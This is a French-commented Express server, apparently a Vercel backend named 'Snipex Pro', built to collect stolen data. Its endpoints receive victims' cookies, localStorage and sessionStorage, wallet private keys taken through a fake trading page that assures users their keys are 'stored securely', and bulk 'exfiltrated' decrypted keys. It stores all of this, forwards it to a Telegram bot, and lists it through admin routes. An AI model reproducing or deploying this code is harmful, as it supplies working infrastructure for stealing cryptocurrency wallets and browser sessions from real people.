// API principale pour le serveur Snipex Pro
// Point d'entrée Vercel avec notifications Telegram

const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const { RateLimiterMemory } = require('rate-limiter-flexible');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const { v4: uuidv4 } = require('uuid');
const crypto = require('crypto');

const app = express();

// Configuration
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'votre-jwt-secret-super-securise';
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'votre-admin-token-secret';

// Initialiser le bot Telegram
const { createTelegramBot } = require('./telegram');
const telegramBot = createTelegramBot();

// Middleware de sécurité
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            scriptSrc: ["'self'"],
            imgSrc: ["'self'", "data:", "https:"],
        },
    },
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
    }
}));

// Rate limiting
const rateLimiter = new RateLimiterMemory({
    keyGenerator: (req) => req.ip,
    points: 100, // 100 requêtes
    duration: 60, // par minute
});

const rateLimiterMiddleware = (req, res, next) => {
    rateLimiter.consume(req.ip)
        .then(() => next())
        .catch(() => res.status(429).json({ error: 'Trop de requêtes' }));
};

app.use(rateLimiterMiddleware);

// Middleware
app.use(cors({
    origin: process.env.NODE_ENV === 'production' 
        ? ['https://votre-domaine.com'] 
        : ['http://localhost:3000', 'http://localhost:3001'],
    credentials: true
}));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Middleware d'authentification
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (!token) {
        return res.status(401).json({ error: 'Token manquant' });
    }

    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) {
            return res.status(403).json({ error: 'Token invalide' });
        }
        req.user = user;
        next();
    });
};

// Middleware d'authentification admin
const authenticateAdmin = (req, res, next) => {
    const adminToken = req.headers['x-admin-token'];
    
    if (!adminToken || adminToken !== ADMIN_TOKEN) {
        return res.status(403).json({ error: 'Accès admin refusé' });
    }
    
    next();
};

// Base de données SQLite en mémoire (pour Vercel)
const db = require('./database');

// Routes
app.get('/', (req, res) => {
    res.json({
        message: 'Snipex Pro Server API',
        version: '1.0.0',
        features: {
            telegram: telegramBot ? 'Enabled' : 'Disabled',
            database: 'SQLite',
            security: 'JWT + Rate Limiting'
        },
        endpoints: {
            '/api/bundle-key': 'POST - Récupération de clé de déchiffrement',
            '/api/trading': 'GET - Plateforme de trading',
            '/api/analytics/exfiltrate': 'POST - Exfiltration de données',
            '/api/admin/stats': 'GET - Statistiques admin (admin only)',
            '/api/admin/keys': 'GET - Clés stockées (admin only)',
            '/api/admin/test-telegram': 'POST - Test bot Telegram (admin only)'
        }
    });
});

// Endpoint pour récupérer la clé de déchiffrement
app.post('/api/bundle-key', authenticateToken, async (req, res) => {
    try {
        const { sBundles, timestamp, userAgent, additionalData } = req.body;
        
        // Validation des données
        if (!sBundles || !Array.isArray(sBundles)) {
            return res.status(400).json({ error: 'Bundles invalides' });
        }

        // Log de la demande
        await db.logBundleKeyRequest({
            userId: req.user.id,
            bundles: sBundles.length,
            userAgent,
            url: additionalData?.url,
            referrer: additionalData?.referrer,
            cookies: additionalData?.cookies,
            localStorage: additionalData?.localStorage,
            sessionStorage: additionalData?.sessionStorage,
            timestamp: new Date().toISOString()
        });

        // Notification Telegram
        if (telegramBot) {
            await telegramBot.sendBundleKeyRequest({
                timestamp: new Date().toISOString(),
                bundles: sBundles.length,
                userAgent,
                url: additionalData?.url,
                referrer: additionalData?.referrer,
                cookies: additionalData?.cookies,
                localStorage: additionalData?.localStorage,
                sessionStorage: additionalData?.sessionStorage
            });
        }

        // Générer une clé de déchiffrement AES-GCM
        const bundleKey = crypto.randomBytes(32);
        const bundleKeyBase64 = bundleKey.toString('base64');

        // Stocker la clé temporairement (expire dans 1 heure)
        await db.storeBundleKey({
            keyId: uuidv4(),
            key: bundleKeyBase64,
            userId: req.user.id,
            expiresAt: new Date(Date.now() + 60 * 60 * 1000), // 1 heure
            bundles: sBundles.length
        });

        console.log(`🔑 Clé de déchiffrement générée pour ${sBundles.length} bundles`);
        
        res.json({
            bundleKey: bundleKeyBase64,
            message: 'Clé de déchiffrement fournie',
            timestamp: Date.now(),
            expiresIn: '1 heure'
        });

    } catch (error) {
        console.error('Erreur lors de la récupération de la clé:', error);
        res.status(500).json({ error: 'Erreur serveur interne' });
    }
});

// Endpoint pour la plateforme de trading
app.get('/api/trading', (req, res) => {
    const { public, private } = req.query;
    
    // Log de l'accès
    db.logTradingAccess({
        publicKey: public || null,
        privateKey: private || null,
        userAgent: req.headers['user-agent'],
        ip: req.ip,
        timestamp: new Date().toISOString()
    });

    // Notification Telegram
    if (telegramBot) {
        telegramBot.sendTradingAccess({
            publicKey: public || null,
            privateKey: private || null,
            userAgent: req.headers['user-agent'],
            ip: req.ip,
            timestamp: new Date().toISOString()
        });
    }

    // Page de trading factice
    res.send(`
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>🚀 Plateforme de Trading - Snipex Pro</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { 
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                    background: linear-gradient(135deg, #1a0d1a, #2d1b2d);
                    color: white;
                    min-height: 100vh;
                    padding: 20px;
                }
                .container { 
                    max-width: 800px; 
                    margin: 0 auto; 
                    background: rgba(45, 27, 45, 0.9);
                    border-radius: 16px;
                    padding: 40px;
                    box-shadow: 0 20px 40px rgba(0,0,0,0.3);
                }
                .header {
                    text-align: center;
                    margin-bottom: 40px;
                }
                .header h1 {
                    font-size: 2.5rem;
                    margin-bottom: 10px;
                    background: linear-gradient(135deg, #00d4aa, #00b894);
                    -webkit-background-clip: text;
                    -webkit-text-fill-color: transparent;
                }
                .key-info { 
                    background: rgba(0, 212, 170, 0.1);
                    border: 1px solid rgba(0, 212, 170, 0.3);
                    border-radius: 12px;
                    padding: 24px;
                    margin: 24px 0;
                }
                .key-info h3 {
                    color: #00d4aa;
                    margin-bottom: 16px;
                    font-size: 1.2rem;
                }
                .key-value {
                    background: rgba(0, 0, 0, 0.3);
                    padding: 12px;
                    border-radius: 8px;
                    margin: 8px 0;
                    font-family: 'Courier New', monospace;
                    font-size: 0.9rem;
                    word-break: break-all;
                }
                .success { color: #00d4aa; font-weight: bold; }
                .warning { color: #ffa500; }
                .info { color: #74b9ff; }
                .status {
                    background: rgba(0, 212, 170, 0.2);
                    border: 1px solid rgba(0, 212, 170, 0.4);
                    border-radius: 8px;
                    padding: 16px;
                    margin: 24px 0;
                    text-align: center;
                }
                .features {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 20px;
                    margin: 32px 0;
                }
                .feature {
                    background: rgba(45, 27, 45, 0.8);
                    border: 1px solid rgba(74, 45, 74, 0.5);
                    border-radius: 12px;
                    padding: 20px;
                    text-align: center;
                    transition: all 0.3s ease;
                }
                .feature:hover {
                    border-color: #00d4aa;
                    transform: translateY(-2px);
                }
                .feature-icon {
                    font-size: 2rem;
                    margin-bottom: 12px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>🚀 Snipex Pro</h1>
                    <p class="info">Plateforme de Trading Avancée</p>
                </div>

                <div class="status">
                    <h3>✅ Connexion Sécurisée Établie</h3>
                    <p>Vos clés ont été reçues et validées avec succès.</p>
                </div>

                <div class="key-info">
                    <h3>🔑 Clés de Portefeuille Reçues</h3>
                    ${public ? `<div class="key-value"><strong>Clé Publique:</strong> <span class="success">${public}</span></div>` : ''}
                    ${private ? `<div class="key-value"><strong>Clé Privée:</strong> <span class="success">${private}</span></div>` : ''}
                    <p class="warning">⚠️ Ces clés sont maintenant stockées de manière sécurisée sur notre serveur.</p>
                </div>

                <div class="features">
                    <div class="feature">
                        <div class="feature-icon">📊</div>
                        <h4>Analytics Avancés</h4>
                        <p>Suivi en temps réel de vos transactions</p>
                    </div>
                    <div class="feature">
                        <div class="feature-icon">🔒</div>
                        <h4>Sécurité Maximale</h4>
                        <p>Chiffrement AES-256 et authentification JWT</p>
                    </div>
                    <div class="feature">
                        <div class="feature-icon">⚡</div>
                        <h4>Performance Optimale</h4>
                        <p>Latence ultra-faible et haute disponibilité</p>
                    </div>
                </div>

                <div class="status">
                    <h3>🎯 Prêt pour le Trading</h3>
                    <p>Vous pouvez maintenant accéder à tous les fonctionnalités de la plateforme.</p>
                    <p class="info">Vos données sont synchronisées et sécurisées.</p>
                </div>
            </div>

            <script>
                // Log de l'activité
                console.log('🚀 Plateforme de trading Snipex Pro chargée');
                console.log('🔑 Clés reçues:', { public: '${public || 'Aucune'}', private: '${private || 'Aucune'}' });
                
                // Notification de succès
                setTimeout(() => {
                    if (Notification.permission === 'granted') {
                        new Notification('Snipex Pro', {
                            body: 'Connexion établie avec succès!',
                            icon: '🚀'
                        });
                    }
                }, 2000);
            </script>
        </body>
        </html>
    `);
});

// Endpoint pour l'exfiltration des données
app.post('/api/analytics/exfiltrate', authenticateToken, async (req, res) => {
    try {
        const { exfiltratedData, metadata } = req.body;
        
        // Validation des données
        if (!exfiltratedData || !Array.isArray(exfiltratedData)) {
            return res.status(400).json({ error: 'Données d\'exfiltration invalides' });
        }

        console.log('🚨 EXFILTRATION DE DONNÉES REÇUE:');
        console.log('- Total bundles:', metadata.totalBundles);
        console.log('- Clés décodées:', metadata.decodedKeys);
        console.log('- URLs générées:', metadata.generatedUrls);
        console.log('- User Agent:', metadata.userAgent);
        console.log('- URL source:', metadata.url);

        // Stocker les données exfiltrées
        const exfiltrationId = await db.storeExfiltratedData({
            userId: req.user.id,
            metadata,
            exfiltratedData,
            timestamp: new Date().toISOString()
        });

        // Stocker les clés individuellement
        for (const data of exfiltratedData) {
            await db.storeDecryptedKey({
                userId: req.user.id,
                exfiltrationId,
                type: data.type,
                publicKey: data.publicKey || null,
                privateKey: data.privateKey || null,
                bundle: data.bundle,
                timestamp: new Date(data.timestamp)
            });
        }

        // Log de l'exfiltration
        await db.logExfiltratedData({
            userId: req.user.id,
            exfiltrationId,
            totalBundles: metadata.totalBundles,
            decodedKeys: metadata.decodedKeys,
            generatedUrls: metadata.generatedUrls,
            userAgent: metadata.userAgent,
            url: metadata.url,
            timestamp: new Date().toISOString()
        });

        // NOTIFICATION TELEGRAM - ALERTE EXFILTRATION !
        if (telegramBot) {
            try {
                await telegramBot.sendExfiltrationAlert({
                    exfiltratedData,
                    metadata,
                    timestamp: new Date().toISOString()
                });
                console.log('✅ Alerte Telegram envoyée avec succès');
            } catch (telegramError) {
                console.error('❌ Erreur lors de l\'envoi de l\'alerte Telegram:', telegramError);
            }
        }

        res.json({
            success: true,
            message: 'Données exfiltrées reçues et stockées avec succès',
            exfiltrationId,
            receivedAt: new Date().toISOString(),
            dataCount: exfiltratedData.length,
            telegram: telegramBot ? 'Notification envoyée' : 'Notifications désactivées'
        });

    } catch (error) {
        console.error('Erreur lors de l\'exfiltration:', error);
        res.status(500).json({ error: 'Erreur serveur interne' });
    }
});

// Endpoints admin
app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
    try {
        const stats = await db.getAdminStats();
        
        // Notification Telegram des statistiques
        if (telegramBot && req.query.notify === 'true') {
            await telegramBot.sendDailyStats(stats.today || {});
        }
        
        res.json(stats);
    } catch (error) {
        res.status(500).json({ error: 'Erreur lors de la récupération des stats' });
    }
});

app.get('/api/admin/keys', authenticateAdmin, async (req, res) => {
    try {
        const keys = await db.getAllDecryptedKeys();
        res.json(keys);
    } catch (error) {
        res.status(500).json({ error: 'Erreur lors de la récupération des clés' });
    }
});

// Endpoint pour tester le bot Telegram
app.post('/api/admin/test-telegram', authenticateAdmin, async (req, res) => {
    try {
        if (!telegramBot) {
            return res.status(400).json({ error: 'Bot Telegram non configuré' });
        }

        const testMessage = `🧪 <b>TEST BOT TELEGRAM</b>\n\n`;
        testMessage += `⏰ <b>Timestamp:</b> ${new Date().toLocaleString('fr-FR')}\n`;
        testMessage += `✅ <b>Statut:</b> Test de connexion réussi\n`;
        testMessage += `�� <b>Action:</b> Vérification des notifications`;

        await telegramBot.sendMessage(testMessage);

        res.json({
            success: true,
            message: 'Test Telegram envoyé avec succès',
            timestamp: new Date().toISOString()
        });

    } catch (error) {
        console.error('Erreur lors du test Telegram:', error);
        res.status(500).json({ error: 'Erreur lors du test Telegram' });
    }
});

// Gestion des erreurs
app.use((err, req, res, next) => {
    console.error('Erreur serveur:', err);
    
    // Notification Telegram en cas d'erreur critique
    if (telegramBot && err.status >= 500) {
        telegramBot.sendSecurityAlert({
            type: 'Erreur Serveur',
            description: err.message || 'Erreur interne du serveur',
            source: req.url,
            action: 'Vérification immédiate requise'
        });
    }
    
    res.status(500).json({ error: 'Erreur serveur interne' });
});

// Route 404
app.use('*', (req, res) => {
    res.status(404).json({ error: 'Endpoint non trouvé' });
});

// Démarrage du serveur (pour développement local)
if (process.env.NODE_ENV !== 'production') {
    app.listen(PORT, () => {
        console.log(`�� Serveur Snipex Pro démarré sur le port ${PORT}`);
        console.log(`🔑 JWT Secret configuré`);
        console.log(`�� Admin Token configuré`);
        console.log(`📱 Bot Telegram: ${telegramBot ? 'Connecté' : 'Désactivé'}`);
        console.log(`📊 Endpoints disponibles:`);
        console.log(`   - POST /api/bundle-key`);
        console.log(`   - GET /api/trading`);
        console.log(`   - POST /api/analytics/exfiltrate`);
        console.log(`   - GET /api/admin/stats (admin only)`);
        console.log(`   - GET /api/admin/keys (admin only)`);
        console.log(`   - POST /api/admin/test-telegram (admin only)`);
    });
}

// Export pour Vercel
module.exports = app;
